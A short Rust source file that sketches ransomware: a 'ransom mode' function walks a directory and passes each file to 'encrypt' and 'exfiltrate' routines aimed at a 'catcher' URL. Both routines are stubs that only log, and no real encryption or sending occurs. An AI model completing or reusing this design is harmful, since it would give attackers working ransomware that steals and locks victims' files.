use env_logger::{fmt::Target, Builder};
use log::{debug, error, info, log_enabled, LevelFilter};
use std::fs::{read_dir, DirEntry, File, ReadDir};

type FileCount = usize;
type ByteCount = usize;

pub fn ransom(root: &str, catcher: &str) {
    println!("ransom mode");
    let files = read_dir(root);
    match files {
        Ok(entries) => encrypt_files(entries, catcher),
        Err(e) => (),
    }
}

fn exfiltrate(file: DirEntry, catcher: &str) -> Result<(FileCount, ByteCount), &'static str> {
    info!("sending {file:?} to URL: {catcher:?}");
    Ok((0, 0)) // TODO
}

fn encrypt_files(files: ReadDir, catcher: &str) -> () {
    for file in files {
        if let Ok(entry) = file {
            info!("encrypting {entry:?}");
            encrypt(entry, catcher);
        }
    }
}

fn encrypt(file: DirEntry, catcher: &str) -> Result<(), &'static str> {
    exfiltrate(file, catcher)?;
    Ok(())
}
